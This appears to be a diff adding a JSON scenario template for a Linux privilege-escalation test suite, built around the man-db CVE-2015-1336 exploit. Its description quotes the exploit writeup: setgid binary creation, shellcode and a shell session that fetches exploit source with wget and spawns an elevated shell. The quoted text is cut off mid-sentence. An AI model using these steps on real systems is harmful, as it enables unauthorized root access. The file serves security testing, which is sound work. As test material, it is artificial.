@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41158",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Man-db 2.6.7.1 - Local Privilege Escalation (CVE-2015-1336)\n\nExploit source code (41158.md):\n```\n/*\nEDB Note:\nman:man -> man:root ~ http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/\nman:root -> root:root ~ http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/\n\nCreateSetgidBinary.c ~ http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c\nDirModifyInotify-20110530.c ~ http://www.halfdog.net/Security/2010/FilesystemRecursionAndSymlinks/DirModifyInotify-20110530.c\n*/\n\n\n\n\n## man:man -> man:root\n\nSetgid Binary Creater: The program CreateSetgidBinary.c allows to create the suitable setgid binary circumventing the kernel protection. Currently creating an empty setgid executable in /var/cache/man would work but writing as user man will remove the setgid flag silently. Hence let root itself write binary code to it keeping the flags. But that is not so simple:\n- Writing an interpreter header would be simple, but start of interpreter in kernel will drop the setgid capability immediately.\n- Hence an ELF binary has to be written. The shellcode from below is just 155 bytes to perform setresgid and execute a shell\n- We need a SUID binary to write arbitrary data to stdout with similar method already used in SuidBinariesAndProcInterface. But they do not just echo, they may perform some kind of transformation, e.g. use basename of arg0 for printing. To avoid transformation do not use SUID binary directly but let ld-linux fault and write out user supplied data without modifications. The faulting can triggered easily using LowMemoryProgramCrashing from previous work.\n- I did not find any SUID binary writing out null-bytes, so they cannot provide the mandatory null-bytes within the ELF header on stdout/stderr. But kernel will help here, just seek beyond end of file before invoking SUID binary, thus filling gap with 0-bytes.\n- The SUID binaries do not write only arg0 but also some error message, thus appending unneeded data to the growing file. As kernel does not allow truncation without losing the setgid property, the SUID binary has to be stopped writing more than needed. This can be done using the nice setrlimit(RLIMIT_FSIZE, ... system call.\n\nProgram Invocation: Following sequence can be used for testing:\n\n```\nroot$ su -s /bin/bash man\nman$ cd\nman$ pwd\n/var/cache/man\nman$ ls -al /proc/self/\ntotal 0\ndr-xr-xr-x   9 man  man  0 May 15 02:08 .\nman$ wget -q http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c\nman$ gcc -o CreateSetgidBinary CreateSetgidBinary.c\nman$ ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg\nCompleted\nman$ ls -al ./escalate\n-rwsrwsr-t 1 man root 155 May 15 02:12 ./escalate\nman$ ./escalate /bin/sh\nman$ ls -al /proc/self/\ntotal 0\ndr-xr-xr-x   9 man  root 0 May 15 02:13 .\n```\n\n\n## man:root -> root:root\n\nFinding hardlinking target: To start with, user man has to hardlink a file not owned by user man. Without hardlink protection (/proc/sys/fs/protected_hardlinks set to 0), any root owned system file will do and c\n```",
+  "cve": "CVE-2015-1336",
+  "exploitdb_id": "41158",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41158",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
